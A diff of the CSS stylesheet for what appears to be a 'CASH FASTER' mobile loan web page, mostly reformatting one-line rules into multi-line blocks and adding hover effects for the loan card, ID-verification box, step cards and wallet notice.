@@ -9,56 +9,351 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   :root {
-    --primary: #1A8C4A; --primary-light: #E8F5EE; --primary-dark: #0F6B38;
-    --gold: #B8912E; --gold-light: #FBF6E8; --gold-dark: #8E6F1F;
-    --bg: #F7F9FB; --bg-card: #FFFFFF; --bg-soft: #F0F4F8;
-    --text: #1A2332; --text-muted: #6B7A8F; --border: #E1E8F0;
+    --primary: #1A8C4A;
+    --primary-light: #E8F5EE;
+    --primary-dark: #0F6B38;
+    --gold: #B8912E;
+    --gold-light: #FBF6E8;
+    --gold-dark: #8E6F1F;
+    --bg: #F7F9FB;
+    --bg-card: #FFFFFF;
+    --bg-soft: #F0F4F8;
+    --text: #1A2332;
+    --text-muted: #6B7A8F;
+    --border: #E1E8F0;
     --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
+    --shadow: 0 8px 32px rgba(26,35,50,0.08);
     --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
-    --success: #16A34A; --success-light: #DCFCE7;
-    --info: #2563EB; --info-light: #DBEAFE;
-    --warning: #D97706; --warning-light: #FEF3C7;
-    --danger: #DC2626; --danger-light: #FEE2E2;
-    --etisalat-blue: #0284C7; --etisalat-light: #E0F2FE;
-    --purple: #7C3AED; --purple-light: #EDE9FE;
-    --font: 'Cairo', sans-serif; --radius: 1.4rem; --radius-sm: 0.9rem;
+    --success: #16A34A;
+    --success-light: #DCFCE7;
+    --info: #2563EB;
+    --info-light: #DBEAFE;
+    --warning: #D97706;
+    --warning-light: #FEF3C7;
+    --danger: #DC2626;
+    --danger-light: #FEE2E2;
+    --etisalat-blue: #0284C7;
+    --etisalat-light: #E0F2FE;
+    --purple: #7C3AED;
+    --purple-light: #EDE9FE;
+    --font: 'Cairo', sans-serif;
+    --radius: 1.4rem;
+    --radius-sm: 0.9rem;
   }
-  body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 1rem; position: relative; overflow-x: hidden; line-height: 1.7; }
-  .watermark { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-  .watermark::before { content: 'CASH FASTER'; position: absolute; font-size: 9rem; font-weight: 900; color: rgba(26,140,74,0.045); letter-spacing: 0.3rem; transform: rotate(-32deg); white-space: nowrap; font-family: var(--font); }
-  .watermark::after { content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER'; position: absolute; font-size: 1.6rem; font-weight: 800; color: rgba(184,145,46,0.04); letter-spacing: 0.2rem; transform: rotate(-32deg); white-space: nowrap; line-height: 5rem; width: 200%; text-align: center; font-family: var(--font); }
-  .app-container { max-width: 520px; width: 100%; background: var(--bg-card); border-radius: 2rem; padding: 1.4rem 1.2rem; box-shadow: var(--shadow-lg); border: 1px solid var(--border); position: relative; z-index: 1; margin-bottom: 1rem; }
-  .promo-strip { background: linear-gradient(135deg, var(--primary-light), var(--gold-light)); border: 1px solid rgba(26,140,74,0.12); border-radius: 3rem; padding: 0.55rem 1.2rem; margin-bottom: 1.2rem; text-align: center; font-size: 0.72rem; color: var(--primary-dark); display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; font-weight: 600; }
+  body {
+    font-family: var(--font);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 1rem;
+    position: relative;
+    overflow-x: hidden;
+    line-height: 1.7;
+  }
+
+  .watermark {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    pointer-events: none;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .watermark::before {
+    content: 'CASH FASTER';
+    position: absolute;
+    font-size: 9rem;
+    font-weight: 900;
+    color: rgba(26,140,74,0.045);
+    letter-spacing: 0.3rem;
+    transform: rotate(-32deg);
+    white-space: nowrap;
+    font-family: var(--font);
+  }
+  .watermark::after {
+    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';
+    position: absolute;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: rgba(184,145,46,0.04);
+    letter-spacing: 0.2rem;
+    transform: rotate(-32deg);
+    white-space: nowrap;
+    line-height: 5rem;
+    width: 200%;
+    text-align: center;
+    font-family: var(--font);
+  }
+
+  .app-container {
+    max-width: 520px;
+    width: 100%;
+    background: var(--bg-card);
+    border-radius: 2rem;
+    padding: 1.4rem 1.2rem;
+    box-shadow: var(--shadow-lg);
+    border: 1px solid var(--border);
+    position: relative;
+    z-index: 1;
+    margin-bottom: 1rem;
+  }
+
+  .promo-strip {
+    background: linear-gradient(135deg, var(--primary-light), var(--gold-light));
+    border: 1px solid rgba(26,140,74,0.12);
+    border-radius: 3rem;
+    padding: 0.55rem 1.2rem;
+    margin-bottom: 1.2rem;
+    text-align: center;
+    font-size: 0.72rem;
+    color: var(--primary-dark);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    font-weight: 600;
+  }
   .promo-strip i { color: var(--primary); }
   .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }
-  .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
   .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }
-  .brand .icon { width: 48px; height: 48px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #FFFFFF; box-shadow: 0 6px 20px rgba(26,140,74,0.25); }
-  .brand h1 { font-size: 1.4rem; font-weight: 900; color: var(--text); letter-spacing: 0.3px; line-height: 1.2; }
-  .brand h1 span { color: var(--gold); display: block; font-size: 0.7rem; letter-spacing: 2px; font-weight: 700; margin-top: 1px; }
-  .header .badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.2); border-radius: 3rem; padding: 0.35rem 0.9rem; font-size: 0.65rem; color: var(--success); display: flex; align-items: center; gap: 0.4rem; font-weight: 700; }
+  .brand .icon {
+    width: 48px; height: 48px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.5rem;
+    color: #FFFFFF;
+    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
+  }
+  .brand h1 {
+    font-size: 1.4rem;
+    font-weight: 900;
+    color: var(--text);
+    letter-spacing: 0.3px;
+    line-height: 1.2;
+  }
+  .brand h1 span {
+    color: var(--gold);
+    display: block;
+    font-size: 0.7rem;
+    letter-spacing: 2px;
+    font-weight: 700;
+    margin-top: 1px;
+  }
+  .header .badge {
+    background: var(--success-light);
+    border: 1px solid rgba(22,163,74,0.2);
+    border-radius: 3rem;
+    padding: 0.35rem 0.9rem;
+    font-size: 0.65rem;
+    color: var(--success);
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+    font-weight: 700;
+  }
   .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
   @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-  .nav-tabs { display: flex; gap: 0.4rem; margin: 1.1rem 0; background: var(--bg-soft); border-radius: 3rem; padding: 0.35rem; }
-  .nav-tabs .tab { flex: 1; text-align: center; padding: 0.55rem 0.3rem; border-radius: 3rem; font-size: 0.65rem; font-weight: 700; color: var(--text-muted); display: flex; align-items: center; justify-content: center; gap: 0.35rem; }
-  .nav-tabs .tab.active { background: var(--bg-card); color: var(--primary-dark); box-shadow: var(--shadow-sm); }
-  .search-box { display: flex; gap: 0.6rem; margin: 0.9rem 0 1.3rem 0; }
-  .search-box input { flex: 1; padding: 0.95rem 1.2rem; border-radius: 3rem; border: 2px solid var(--border); background: var(--bg-soft); color: var(--text); font-size: 0.95rem; text-align: center; font-family: var(--font); font-weight: 600; letter-spacing: 1px; }
-  .search-box input:focus { outline: none; border-color: var(--primary); background: #FFFFFF; box-shadow: 0 0 0 4px rgba(26,140,74,0.1); }
-  .search-box button { padding: 0.95rem 1.6rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #FFFFFF; font-weight: 800; cursor: pointer; font-family: var(--font); font-size: 0.9rem; display: flex; align-items: center; gap: 0.5rem; box-shadow: 0 6px 20px rgba(26,140,74,0.25); white-space: nowrap; }
-  .loan-card { background: linear-gradient(145deg, #FFFFFF, #FAFCFE); border-radius: var(--radius); padding: 1.5rem 1.2rem; border: 1px solid var(--border); margin-bottom: 1rem; box-shadow: var(--shadow-sm); }
-  .loan-card .loan-label { font-size: 0.7rem; color: var(--text-muted); letter-spacing: 1.5px; text-align: center; font-weight: 700; }
-  .loan-card .loan-amount-main { text-align: center; font-size: 2.8rem; font-weight: 900; color: var(--primary-dark); margin: 0.3rem 0; line-height: 1.1; }
-  .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 700; }
-  .loan-card .loan-percent { text-align: center; font-size: 0.85rem; color: var(--success); font-weight: 800; margin-bottom: 0.8rem; }
-  .loan-details-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.6rem; margin-top: 1rem; padding-top: 1rem; border-top: 1px dashed var(--border); }
-  .loan-details-grid .detail-item { text-align: center; background: var(--bg-soft); border-radius: var(--radius-sm); padding: 0.6rem 0.3rem; }
-  .loan-details-grid .detail-item .label { font-size: 0.55rem; color: var(--text-muted); font-weight: 700; }
-  .loan-details-grid .detail-item .value { font-size: 0.88rem; font-weight: 800; color: var(--text); margin-top: 0.2rem; }
+
+  .nav-tabs {
+    display: flex;
+    gap: 0.4rem;
+    margin: 1.1rem 0;
+    background: var(--bg-soft);
+    border-radius: 3rem;
+    padding: 0.35rem;
+  }
+  .nav-tabs .tab {
+    flex: 1;
+    text-align: center;
+    padding: 0.55rem 0.3rem;
+    border-radius: 3rem;
+    font-size: 0.65rem;
+    font-weight: 700;
+    color: var(--text-muted);
+    transition: 0.25s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.35rem;
+  }
+  .nav-tabs .tab.active {
+    background: var(--bg-card);
+    color: var(--primary-dark);
+    box-shadow: var(--shadow-sm);
+  }
+
+  /* ===== صندوق البحث ===== */
+  .search-box {
+    display: flex;
+    gap: 0.6rem;
+    margin: 0.9rem 0 1.3rem 0;
+  }
+  .search-box input {
+    flex: 1;
+    padding: 0.95rem 1.2rem;
+    border-radius: 3rem;
+    border: 2px solid var(--border);
+    background: var(--bg-soft);
+    color: var(--text);
+    font-size: 0.95rem;
+    text-align: center;
+    transition: 0.25s;
+    font-family: var(--font);
+    font-weight: 600;
+    letter-spacing: 1px;
+  }
+  .search-box input:focus {
+    outline: none;
+    border-color: var(--primary);
+    background: #FFFFFF;
+    box-shadow: 0 0 0 4px rgba(26,140,74,0.1);
+  }
+  .search-box input::placeholder {
+    color: var(--text-muted);
+    font-weight: 400;
+    letter-spacing: 0;
+  }
+  .search-box button {
+    padding: 0.95rem 1.6rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    color: #FFFFFF;
+    font-weight: 800;
+    cursor: pointer;
+    transition: 0.25s;
+    font-family: var(--font);
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
+    white-space: nowrap;
+  }
+  .search-box button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 28px rgba(26,140,74,0.35);
+  }
+
+  .loan-card {
+    background: linear-gradient(145deg, #FFFFFF, #FAFCFE);
+    border-radius: var(--radius);
+    padding: 1.5rem 1.2rem;
+    border: 1px solid var(--border);
+    margin-bottom: 1rem;
+    position: relative;
+    overflow: hidden;
+    box-shadow: var(--shadow-sm);
+  }
+  .loan-card::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 120px; height: 120px;
+    background: radial-gradient(circle, rgba(184,145,46,0.08), transparent 70%);
+    pointer-events: none;
+  }
+  .loan-card .loan-label {
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    text-align: center;
+    font-weight: 700;
+  }
+  .loan-card .loan-amount-main {
+    text-align: center;
+    font-size: 2.8rem;
+    font-weight: 900;
+    color: var(--primary-dark);
+    margin: 0.3rem 0;
+    letter-spacing: 1px;
+    line-height: 1.1;
+  }
+  .loan-card .loan-amount-main .currency {
+    font-size: 1.2rem;
+    color: var(--text-muted);
+    font-weight: 700;
+  }
+  .loan-card .loan-percent {
+    text-align: center;
+    font-size: 0.85rem;
+    color: var(--success);
+    font-weight: 800;
+    margin-bottom: 0.8rem;
+  }
+  .loan-card .loan-percent i { margin-left: 0.4rem; }
+
+  .loan-details-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 0.6rem;
+    margin-top: 1rem;
+    padding-top: 1rem;
+    border-top: 1px dashed var(--border);
+  }
+  .loan-details-grid .detail-item {
+    text-align: center;
+    background: var(--bg-soft);
+    border-radius: var(--radius-sm);
+    padding: 0.6rem 0.3rem;
+    transition: 0.2s;
+  }
+  .loan-details-grid .detail-item:hover { background: var(--primary-light); }
+  .loan-details-grid .detail-item .label {
+    font-size: 0.55rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    font-weight: 700;
+  }
+  .loan-details-grid .detail-item .value {
+    font-size: 0.88rem;
+    font-weight: 800;
+    color: var(--text);
+    margin-top: 0.2rem;
+  }
   .loan-details-grid .detail-item .value.gold { color: var(--gold-dark); }
   .loan-details-grid .detail-item .value.green { color: var(--success); }
-  .status-bar { display: flex; align-items: center; gap: 0.8rem; background: var(--bg-card); border-radius: var(--radius); padding: 0.9rem 1.1rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .status-bar .status-icon { width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
+
+  .status-bar {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 0.9rem 1.1rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .status-bar .status-icon {
+    width: 42px; height: 42px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
   .status-bar .status-text { flex: 1; }
   .status-bar .status-text .main { font-weight: 800; font-size: 0.9rem; line-height: 1.3; }
   .status-bar .status-text .sub { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.15rem; }
@@ -68,91 +363,448 @@
   .status-bar.warning { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
   .status-bar.warning .status-icon { background: var(--warning-light); color: var(--warning); }
   .status-bar.warning .status-text .main { color: var(--warning); }
-  .client-info { background: var(--bg-card); border-radius: var(--radius); padding: 1rem 1.2rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .client-info .info-title { font-size: 0.75rem; font-weight: 800; color: var(--text-muted); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.5rem; }
+
+  .client-info {
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 1rem 1.2rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .client-info .info-title {
+    font-size: 0.75rem;
+    font-weight: 800;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 0.6rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
   .client-info .info-title i { color: var(--primary); }
-  .client-info .row { display: flex; justify-content: space-between; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 0.5rem; }
+  .client-info .row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.55rem 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.85rem;
+    gap: 0.5rem;
+  }
   .client-info .row:last-child { border-bottom: none; }
   .client-info .row .key { color: var(--text-muted); font-weight: 600; flex-shrink: 0; }
   .client-info .row .value { font-weight: 700; text-align: left; color: var(--text); word-break: break-word; }
   .client-info .row .value.gold { color: var(--gold-dark); }
   .client-info .row .value.green { color: var(--success); }
-  .id-verification { background: linear-gradient(135deg, #FFFFFF, var(--gold-light)); border: 2px solid var(--gold); border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
-  .id-verification .idv-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.8rem; padding-bottom: 0.6rem; border-bottom: 1px solid rgba(184,145,46,0.2); }
-  .id-verification .idv-header .idv-icon { width: 38px; height: 38px; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #FFFFFF; font-size: 1rem; flex-shrink: 0; }
-  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); }
+
+  .id-verification {
+    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
+    border: 2px solid var(--gold);
+    border-radius: var(--radius);
+    padding: 1.1rem;
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .id-verification .idv-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    margin-bottom: 0.8rem;
+    padding-bottom: 0.6rem;
+    border-bottom: 1px solid rgba(184,145,46,0.2);
+  }
+  .id-verification .idv-header .idv-icon {
+    width: 38px; height: 38px;
+    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
+  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); line-height: 1.3; }
   .id-verification .idv-header p { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.1rem; }
-  .id-verification .idv-image-box { background: #FFFFFF; border: 1px dashed var(--gold); border-radius: var(--radius-sm); padding: 0.6rem; text-align: center; overflow: hidden; }
-  .id-verification .idv-image-box img { max-width: 100%; height: auto; border-radius: 0.6rem; display: block; margin: 0 auto; max-height: 320px; object-fit: contain; }
-  .id-verification .idv-image-box .idv-placeholder { padding: 1.5rem 0.5rem; color: var(--text-muted); font-size: 0.78rem; font-weight: 600; }
-  .id-verification .idv-caption { font-size: 0.68rem; color: var(--text-muted); text-align: center; margin-top: 0.5rem; font-weight: 600; }
-  .steps-container { background: var(--bg-card); border-radius: var(--radius); padding: 1.3rem 1.1rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .steps-container .steps-header { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 1rem; padding-bottom: 0.8rem; border-bottom: 2px solid var(--primary-light); }
-  .steps-container .steps-header .icon { width: 42px; height: 42px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #FFFFFF; font-size: 1.1rem; flex-shrink: 0; }
+  .id-verification .idv-image-box {
+    background: #FFFFFF;
+    border: 1px dashed var(--gold);
+    border-radius: var(--radius-sm);
+    padding: 0.6rem;
+    text-align: center;
+    overflow: hidden;
+  }
+  .id-verification .idv-image-box img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 0.6rem;
+    display: block;
+    margin: 0 auto;
+    max-height: 320px;
+    object-fit: contain;
+  }
+  .id-verification .idv-image-box .idv-placeholder {
+    padding: 1.5rem 0.5rem;
+    color: var(--text-muted);
+    font-size: 0.78rem;
+    font-weight: 600;
+  }
+  .id-verification .idv-image-box .idv-placeholder i {
+    font-size: 2rem;
+    color: var(--gold);
+    display: block;
+    margin-bottom: 0.4rem;
+  }
+  .id-verification .idv-caption {
+    font-size: 0.68rem;
+    color: var(--text-muted);
+    text-align: center;
+    margin-top: 0.5rem;
+    font-weight: 600;
+  }
+
+  .steps-container {
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 1.3rem 1.1rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .steps-container .steps-header {
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    margin-bottom: 1rem;
+    padding-bottom: 0.8rem;
+    border-bottom: 2px solid var(--primary-light);
+  }
+  .steps-container .steps-header .icon {
+    width: 42px; height: 42px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1.1rem;
+    flex-shrink: 0;
+  }
   .steps-container .steps-header h3 { font-size: 1rem; font-weight: 800; color: var(--text); line-height: 1.3; }
   .steps-container .steps-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }
-  .code-box { background: linear-gradient(135deg, var(--gold-light), #FFFDF7); border: 2px dashed var(--gold); border-radius: var(--radius-sm); padding: 0.9rem; margin: 0.8rem 0; text-align: center; }
-  .code-box .code-label { font-size: 0.65rem; color: var(--gold-dark); font-weight: 700; margin-bottom: 0.35rem; text-transform: uppercase; letter-spacing: 1px; }
-  .code-box .code-value { font-size: 1.6rem; font-weight: 900; color: var(--gold-dark); font-family: 'Courier New', monospace; direction: ltr; letter-spacing: 2px; }
+
+  .code-box {
+    background: linear-gradient(135deg, var(--gold-light), #FFFDF7);
+    border: 2px dashed var(--gold);
+    border-radius: var(--radius-sm);
+    padding: 0.9rem;
+    margin: 0.8rem 0;
+    text-align: center;
+  }
+  .code-box .code-label {
+    font-size: 0.65rem;
+    color: var(--gold-dark);
+    font-weight: 700;
+    margin-bottom: 0.35rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .code-box .code-value {
+    font-size: 1.6rem;
+    font-weight: 900;
+    color: var(--gold-dark);
+    font-family: 'Courier New', monospace;
+    direction: ltr;
+    letter-spacing: 2px;
+  }
   .code-box .code-hint { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.3rem; }
+
   .step-cards { display: flex; flex-direction: column; gap: 0.7rem; margin: 0.9rem 0; }
-  .step-cards .step-card { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.9rem 1rem; background: linear-gradient(135deg, #FFFFFF, var(--bg-soft)); border: 1.5px solid var(--border); border-radius: var(--radius-sm); position: relative; overflow: hidden; }
-  .step-cards .step-card::before { content: ''; position: absolute; top: 0; right: 0; width: 4px; height: 100%; background: linear-gradient(180deg, var(--primary), var(--primary-dark)); }
-  .step-cards .step-card .step-num { min-width: 40px; height: 40px; border-radius: 12px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #FFFFFF; font-weight: 900; font-size: 1.1rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; box-shadow: 0 4px 12px rgba(26,140,74,0.25); }
+  .step-cards .step-card {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.8rem;
+    padding: 0.9rem 1rem;
+    background: linear-gradient(135deg, #FFFFFF, var(--bg-soft));
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm);
+    transition: 0.25s;
+    position: relative;
+    overflow: hidden;
+  }
+  .step-cards .step-card::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 4px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--primary), var(--primary-dark));
+    transition: 0.25s;
+  }
+  .step-cards .step-card:hover {
+    border-color: var(--primary);
+    box-shadow: 0 4px 16px rgba(26,140,74,0.1);
+    transform: translateX(-2px);
+  }
+  .step-cards .step-card .step-num {
+    min-width: 40px;
+    height: 40px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    color: #FFFFFF;
+    font-weight: 900;
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(26,140,74,0.25);
+  }
   .step-cards .step-card .step-content { flex: 1; padding-top: 0.1rem; }
-  .step-cards .step-card .step-content .step-title { font-size: 0.88rem; font-weight: 800; color: var(--text); margin-bottom: 0.15rem; line-height: 1.4; }
-  .step-cards .step-card .step-content .step-desc { font-size: 0.75rem; color: var(--text-muted); line-height: 1.7; }
+  .step-cards .step-card .step-content .step-title {
+    font-size: 0.88rem;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 0.15rem;
+    line-height: 1.4;
+  }
+  .step-cards .step-card .step-content .step-desc {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    line-height: 1.7;
+  }
   .step-cards .step-card .step-content .step-desc strong { color: var(--primary-dark); font-weight: 800; }
   .step-cards .step-card .step-content .step-desc .gold-text { color: var(--gold-dark); font-weight: 800; }
-  .amount-box { background: linear-gradient(135deg, var(--primary-light), #F5FBF7); border: 1px solid rgba(26,140,74,0.15); border-radius: var(--radius-sm); padding: 0.9rem; margin: 0.8rem 0; text-align: center; }
+
+  .amount-box {
+    background: linear-gradient(135deg, var(--primary-light), #F5FBF7);
+    border: 1px solid rgba(26,140,74,0.15);
+    border-radius: var(--radius-sm);
+    padding: 0.9rem;
+    margin: 0.8rem 0;
+    text-align: center;
+  }
   .amount-box .amount-label { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; }
   .amount-box .amount-value { font-size: 1.5rem; font-weight: 900; color: var(--primary-dark); margin: 0.2rem 0; line-height: 1.1; }
   .amount-box .amount-sub { font-size: 0.68rem; color: var(--text-muted); }
-  .open-wallet-box { background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); border: 2px solid var(--warning); border-radius: var(--radius); padding: 1.3rem 1.1rem; margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .open-wallet-box .ow-header { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 0.9rem; padding-bottom: 0.8rem; border-bottom: 1px solid rgba(217,119,6,0.2); }
-  .open-wallet-box .ow-header .ow-icon { width: 46px; height: 46px; background: linear-gradient(135deg, var(--warning), #B45309); border-radius: 13px; display: flex; align-items: center; justify-content: center; color: #FFFFFF; font-size: 1.3rem; flex-shrink: 0; box-shadow: 0 4px 12px rgba(217,119,6,0.25); }
+
+  .open-wallet-box {
+    background: linear-gradient(135deg, #FFFFFF, var(--warning-light));
+    border: 2px solid var(--warning);
+    border-radius: var(--radius);
+    padding: 1.3rem 1.1rem;
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+    position: relative;
+    overflow: hidden;
+  }
+  .open-wallet-box .ow-header {
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    margin-bottom: 0.9rem;
+    padding-bottom: 0.8rem;
+    border-bottom: 1px solid rgba(217,119,6,0.2);
+  }
+  .open-wallet-box .ow-header .ow-icon {
+    width: 46px;
+    height: 46px;
+    background: linear-gradient(135deg, var(--warning), #B45309);
+    border-radius: 13px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1.3rem;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(217,119,6,0.25);
+  }
   .open-wallet-box .ow-header h3 { font-size: 1rem; font-weight: 800; color: var(--warning); line-height: 1.3; }
   .open-wallet-box .ow-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }
+
   .open-wallet-box .ow-body .greeting { font-size: 0.9rem; font-weight: 800; color: var(--text); margin-bottom: 0.5rem; }
-  .open-wallet-box .ow-body .main-notice { background: #FFFFFF; border-right: 4px solid var(--warning); border-radius: 0.7rem; padding: 0.8rem 1rem; margin: 0.7rem 0; font-size: 0.85rem; line-height: 1.9; color: var(--text); }
+  .open-wallet-box .ow-body .main-notice {
+    background: #FFFFFF;
+    border-right: 4px solid var(--warning);
+    border-radius: 0.7rem;
+    padding: 0.8rem 1rem;
+    margin: 0.7rem 0;
+    font-size: 0.85rem;
+    line-height: 1.9;
+    color: var(--text);
+  }
   .open-wallet-box .ow-body .main-notice strong { color: var(--warning); font-weight: 800; }
   .open-wallet-box .ow-body .main-notice .danger-text { color: var(--danger); font-weight: 800; }
+
   .open-wallet-box .ow-steps { display: flex; flex-direction: column; gap: 0.6rem; margin: 0.8rem 0; }
-  .open-wallet-box .ow-steps .ow-step { display: flex; align-items: flex-start; gap: 0.7rem; padding: 0.8rem 0.9rem; background: #FFFFFF; border: 1.5px solid rgba(217,119,6,0.15); border-radius: var(--radius-sm); font-size: 0.82rem; line-height: 1.7; color: var(--text); }
-  .open-wallet-box .ow-steps .ow-step .ow-num { min-width: 32px; height: 32px; border-radius: 10px; background: linear-gradient(135deg, var(--warning), #B45309); color: #FFFFFF; font-weight: 800; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .open-wallet-box .ow-steps .ow-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.7rem;
+    padding: 0.8rem 0.9rem;
+    background: #FFFFFF;
+    border: 1.5px solid rgba(217,119,6,0.15);
+    border-radius: var(--radius-sm);
+    font-size: 0.82rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+  .open-wallet-box .ow-steps .ow-step .ow-num {
+    min-width: 32px;
+    height: 32px;
+    border-radius: 10px;
